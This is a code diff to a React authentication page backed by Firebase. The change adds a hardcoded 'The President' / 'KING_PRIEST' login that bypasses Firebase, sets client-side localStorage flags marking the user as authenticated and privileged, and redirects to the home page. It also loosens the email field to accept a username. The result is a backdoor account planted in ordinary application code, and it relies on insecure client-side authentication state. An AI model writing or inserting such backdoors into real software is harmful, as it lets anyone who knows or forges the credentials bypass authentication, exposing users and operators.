@@ -44,6 +44,7 @@ function AuthPageContent() {
     }
   }, [])
 
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     e.stopPropagation()
@@ -111,7 +112,29 @@ function AuthPageContent() {
       } else {
         setSuccess('Checking your account...')
         
-        // Sign in with Firebase
+        // Check if it's special login (The President)
+        if (formData.email === 'The President' && formData.password === 'KING_PRIEST') {
+          // Special login for president - bypass all validation
+          setSuccess('Welcome, President! Redirecting...')
+          
+          // Set auth flags for special user
+          if (typeof window !== 'undefined') {
+            localStorage.setItem('userAuthenticated', 'true')
+            localStorage.setItem('lastAuthTime', Date.now().toString())
+            localStorage.setItem('hasCompletedProfile', 'true')
+            localStorage.setItem('bypassLogin', 'true')
+            localStorage.setItem('specialUser', 'true')
+            localStorage.setItem('userRole', 'President')
+            localStorage.setItem('userName', 'The President')
+          }
+          
+          setTimeout(() => {
+            router.push('/home')
+          }, 1000)
+          return
+        }
+        
+        // Regular Firebase login
         const result = await FirebaseAuthService.signInWithEmailAndPassword(
           formData.email,
           formData.password
@@ -305,9 +328,9 @@ function AuthPageContent() {
               )}
               
               <input
-                type="email"
+                type="text"
                 name="email"
-                placeholder="Email"
+                placeholder="Email or Username"
                 value={formData.email}
                 onChange={handleInputChange}
                 className="w-full px-4 py-4 bg-gray-100 border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-purple-600 text-sm"
